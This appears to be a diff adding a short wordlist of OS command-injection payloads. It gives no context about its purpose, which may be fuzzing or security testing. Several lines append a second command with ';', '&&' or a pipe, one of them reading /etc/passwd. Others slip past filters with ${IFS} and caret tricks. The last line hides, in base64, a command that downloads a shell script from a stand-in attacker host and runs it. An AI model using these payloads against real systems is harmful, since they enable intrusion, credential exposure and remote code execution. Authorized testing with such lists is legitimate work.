@@ -1,0 +1,6 @@
+;id
+&& whoami
+| cat /etc/passwd
+${IFS}whoami
+who^ami
+echo${IFS}Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=|base64${IFS}-d|sh
